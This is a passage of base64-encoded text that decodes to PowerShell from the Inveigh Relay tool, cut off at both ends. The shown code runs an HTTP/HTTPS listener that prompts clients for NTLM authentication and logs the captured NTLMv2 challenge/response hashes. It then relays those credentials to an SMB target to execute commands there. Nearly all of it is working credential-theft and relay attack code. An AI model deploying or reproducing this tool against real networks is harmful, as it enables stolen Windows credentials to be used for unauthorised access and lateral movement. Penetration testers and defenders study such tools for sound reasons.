luZyArICI6IiArICROVExNX2NoYWxsZW5nZSArICI6IiArICROVExNX3Jlc3BvbnNlCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoJE5UTE1fY2hhbGxlbmdlIC1hbmQgJE5UTE1fcmVzcG9uc2UgLWFuZCAoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCQoR2V0LURhdGUgLWZvcm1hdCAncycpICsgIiAtICRIVFRQX3R5cGUgTlRMTXYyIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzICsgIigiICsgJEhUVFBfTlRMTV9ob3N0X3N0cmluZyArICIpIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZS5BZGQoJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9saXN0LkFkZCgkaW52ZWlnaC5IVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgKyAiIC0gJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyArICIoIiArICRIVFRQX05UTE1faG9zdF9zdHJpbmcgKyAiKTpgbiIgKyAkaW52ZWlnaC5IVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIHdyaXR0ZW4gdG8gIiArICRpbnZlaWdoLk5UTE12Ml9vdXRfZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykgLWFuZCAhJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgKz0gJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuU3RhdHVzQ29kZSA9IDIwMAogICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gJycKICAgICAgICAgICAgICAgICRIVFRQX3Jhd191cmxfb3V0cHV0ID0gJHRydWUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCRpbnZlaWdoLlNNQl9yZWxheSAtYW5kICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCAtZXEgMykKICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgaWYoISRTTUJSZWxheVVzZXJuYW1lcyAtb3IgJFNNQlJlbGF5VXNlcm5hbWVzIC1jb250YWlucyAkSFRUUF9OVExNX3VzZXJfc3RyaW5nIC1vciAkU01CUmVsYXlVc2VybmFtZXMgLWNvbnRhaW5zICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKQogICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guU01CUmVsYXlfZmFpbGVkX2xpc3QgLW5vdGNvbnRhaW5zICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkTlRMTV90eXBlIC1lcSAnTlRMTXYyJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTZW5kaW5nICROVExNX3R5cGUgcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGZvciByZWxheSB0byAkU01CUmVsYXl0YXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTZW5kaW5nICROVExNX3R5cGUgcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGZvciByZWxheSB0byAkU01CUmVsYXl0YXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2VfcmV0dXJuX2J5dGVzID0gU01CUmVsYXlSZXNwb25zZSAkU01CX3JlbGF5X3NvY2tldCAkSFRUUF9yZXF1ZXN0X2J5dGVzICRTTUJfdXNlcl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3JldHVybl9ieXRlcyA9ICRTTUJfcmVsYXlfcmVzcG9uc2VfcmV0dXJuX2J5dGVzWzEuLiRTTUJfcmVsYXlfcmVzcG9uc2VfcmV0dXJuX2J5dGVzLkxlbmd0aF0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoISRTTUJfcmVsYXlfZmFpbGVkIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X3Jlc3BvbnNlX3JldHVybl9ieXRlc1s5Li4xMl0pIC1lcSAnMDAtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gc3VjY2Vzc2Z1bCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IGF1dGhlbnRpY2F0aW9uIHN1Y2Nlc3NmdWwgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNNQlJlbGF5RXhlY3V0ZSAkU01CX3JlbGF5X3NvY2tldCAkU01CX3VzZXJfSUQgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gZmFpbGVkIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gZmFpbGVkIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJSZWxheV9mYWlsZWRfbGlzdC5BZGQoIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJOVExNdjEgU01CIHJlbGF5IG5vdCB5ZXQgc3VwcG9ydGVkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTlRMTXYxIHJlbGF5IG5vdCB5ZXQgc3VwcG9ydGVkIildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJBYm9ydGluZyBTTUIgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaGFzIGFscmVhZHkgYmVlbiB0cmllZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEFib3J0aW5nIHJlbGF5IHNpbmNlICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGhhcyBhbHJlYWR5IGJlZW4gdHJpZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIkFib3J0aW5nIFNNQiByZWxheSBzaW5jZSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGFwcGVhcnMgdG8gYmUgYSBtYWNoaW5lIGFjY291bnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gQWJvcnRpbmcgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV91c2VyX3N0cmluZyBhcHBlYXJzIHRvIGJlIGEgbWFjaGluZSBhY2NvdW50IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgbm90IG9uIFNNQiByZWxheSB1c2VybmFtZSBsaXN0IikKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgbm90IG9uIHJlbGF5IHVzZXJuYW1lIGxpc3QiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE5UTE0gPSAnTlRMTScKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgIH0KICAgICAgICAKICAgICAgICBbQnl0ZVtdXSAkSFRUUF9idWZmZXIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRpbnZlaWdoLm1lc3NhZ2UpCiAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuQ29udGVudExlbmd0aDY0ID0gJEhUVFBfYnVmZmVyLkxlbmd0aAogICAgICAgICRpbnZlaWdoLnJlc3BvbnNlLkFkZEhlYWRlcigiV1dXLUF1dGhlbnRpY2F0ZSIsJE5UTE0pCiAgICAgICAgJEhUVFBfc3RyZWFtID0gJGludmVpZ2gucmVzcG9uc2UuT3V0cHV0U3RyZWFtCiAgICAgICAgJEhUVFBfc3RyZWFtLldyaXRlKCRIVFRQX2J1ZmZlciwwLCRIVFRQX2J1ZmZlci5MZW5ndGgpCiAgICAgICAgJEhUVFBfc3RyZWFtLmNsb3NlKCkKICAgIH0KCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlN0b3AoKQogICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5DbG9zZSgpCn0KCiRjb250cm9sX3JlbGF5X3NjcmlwdGJsb2NrID0gCnsKICAgIHBhcmFtICgkUnVuVGltZSkKCiAgICBpZigkUnVuVGltZSkKICAgIHsgICAgCiAgICAgICAgJGNvbnRyb2xfdGltZW91dCA9IE5ldy1UaW1lc3BhbiAtTWludXRlcyAkUnVuVGltZQogICAgICAgICRjb250cm9sX3N0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgfQogICAgICAgCiAgICB3aGlsZSAoJGludmVpZ2gucmVsYXlfcnVubmluZykKICAgIHsKCiAgICAgICAgaWYoJFJ1blRpbWUpCiAgICAgICAgewoKICAgICAgICAgICAgaWYoJGNvbnRyb2xfc3RvcHdhdGNoLkVsYXBzZWQgLWdlICRjb250cm9sX3RpbWVvdXQpCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLklzTGlzdGVuaW5nKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuU3RvcCgpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5DbG9zZSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIkludmVpZ2ggUmVsYXkgZXhpdGVkIGR1ZSB0byBydW4gdGltZSBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIFJlbGF5IGV4aXRlZCBkdWUgdG8gcnVuIHRpbWUiKV0pCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5yZWxheV9ydW5uaW5nID0gJGZhbHNlCgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guSFRUUFMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJiAibmV0c2giIGh0dHAgZGVsZXRlIHNzbGNlcnQgaXBwb3J0PTAuMC4wLjA6NDQzID4gJG51bGwKICAgICAgICAKICAgICAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzLlg1MDlTdG9yZSgiTXkiLCJMb2NhbE1hY2hpbmUiKQogICAgICAgICAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuT3BlbignUmVhZFdyaXRlJykKICAgICAgICAgICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlID0gJGNlcnRpZmljYXRlX3N0b3JlLmNlcnRpZmljYXRlcy5GaW5kKCJGaW5kQnlUaHVtYnByaW50IiwkaW52ZWlnaC5jZXJ0aWZpY2F0ZV90aHVtYnByaW50LCRmYWxzZSlbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLlJlbW92ZSgkY2VydGlmaWNhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guc3RhdHVzX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNTTCBDZXJ0aWZpY2F0ZSBEZWxldGlvbiBFcnJvciAtIFJlbW92ZSBNYW51YWxseSIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU1NMIENlcnRpZmljYXRlIERlbGV0aW9uIEVycm9yIC0gUmVtb3ZlIE1hbnVhbGx5IikKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkiIHwgT3V0LUZpbGUgJEludmVpZ2gubG9nX291dF9maWxlIC1BcHBlbmQgICAKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfSAgICAgCgogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUCA9ICRmYWxzZQogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkZmFsc2UKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0IC1hbmQgKCEkaW52ZWlnaC5ydW5uaW5nIC1vciAhJGludmVpZ2guYnJ1dGVmb3JjZV9ydW5uaW5nKSkKICAgICAgICB7CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2gubG9nX291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLk5UTE12MV9vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfZmlsZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLk5UTE12Ml9maWxlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZVswXXxPdXQtRmlsZSAkaW52ZWlnaC5OVExNdjJfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2ZpbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICB9CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5jbGVhcnRleHRfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2guY2xlYXJ0ZXh0X291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNsZWFydGV4dF9maWxlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgIH0KCiAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgfQoKIH0KCiMgSFRUUC9IVFRQUyBMaXN0ZW5lciBTdGFydHVwIGZ1bmN0aW9uIApmdW5jdGlvbiBIVFRQTGlzdGVuZXIoKQp7CiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHBMaXN0ZW5lcgoKICAgIGlmKCRpbnZlaWdoLkhUVFApCiAgICB7CiAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5QcmVmaXhlcy5BZGQoJ2h0dHA6Ly8qOjgwLycpCiAgICB9CgogICAgaWYoJGludmVpZ2guSFRUUFMpCiAgICB7CiAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5QcmVmaXhlcy5BZGQoJ2h0dHBzOi8vKjo0NDMvJykKICAgIH0KCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLkF1dGhlbnRpY2F0aW9uU2NoZW1lcyA9ICJBbm9ueW1vdXMiIAogICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5TdGFydCgpCiAgICAkSFRUUF9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkSFRUUF9ydW5zcGFjZS5PcGVuKCkKICAgICRIVFRQX3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRIVFRQX3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkSFRUUF9wb3dlcnNoZWxsLlJ1bnNwYWNlID0gJEhUVFBfcnVuc3BhY2UKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX3JlbGF5X2NoYWxsZW5nZV9zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJFNNQl9yZWxheV9yZXNwb25zZV9zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJFNNQl9yZWxheV9leGVjdXRlX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX05UTE1fZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkSFRUUF9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoCiAgICAgICAgJFNNQlJlbGF5VGFyZ2V0KS5BZGRBcmd1bWVudCgkU01CUmVsYXlDb21tYW5kKS5BZGRBcmd1bWVudCgkU01CUmVsYXlVc2VybmFtZXMpLkFkZEFyZ3VtZW50KAogICAgICAgICRTTUJSZWxheUF1dG9EaXNhYmxlKS5B